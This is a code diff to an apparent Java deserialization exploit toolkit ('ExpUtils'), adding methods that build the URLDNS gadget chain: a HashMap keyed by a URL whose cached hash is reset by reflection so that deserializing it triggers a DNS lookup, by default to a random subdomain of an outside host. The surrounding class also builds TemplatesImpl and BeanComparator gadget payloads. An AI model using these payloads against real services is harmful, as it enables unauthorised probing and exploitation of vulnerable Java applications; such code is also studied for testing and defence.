@@ -7,7 +7,11 @@ import org.apache.commons.beanutils.BeanComparator;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.math.BigInteger;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.util.HashMap;
 import java.util.PriorityQueue;
+import java.util.Random;
 
 import static expUtils.ReflectUtils.getClassByte;
 
@@ -21,6 +25,21 @@ public class ExpUtils {
         ReflectUtils.setFields(templates,"_tfactory",new TransformerFactoryImpl());
 //        templates.getOutputProperties();
         return templates;
+    }
+//    URLDNS链 带参数方式
+    public static HashMap<Object,Object> getURLDNSChains(String targetUrl) throws MalformedURLException, NoSuchFieldException, IllegalAccessException {
+        HashMap<Object,Object> hashMap = new HashMap<Object,Object>();
+        URL url = new URL(targetUrl);
+        hashMap.put(url,"1");
+        ReflectUtils.setFields(url,"hashCode",-1);
+        return hashMap;
+    }
+    //    URLDNS链 默认方式
+    public static HashMap<Object,Object> getURLDNSChains() throws MalformedURLException, NoSuchFieldException, IllegalAccessException {
+        String prefix = String.valueOf(new Random().nextInt(100));
+//        HashMap<Object,Object> hashMap = new HashMap<Object,Object>();
+        String targetUrl  = "http://" + prefix + ".a.9eek.cn";
+        return getURLDNSChains(targetUrl);
     }
 
 //    序列化对象到特定路径
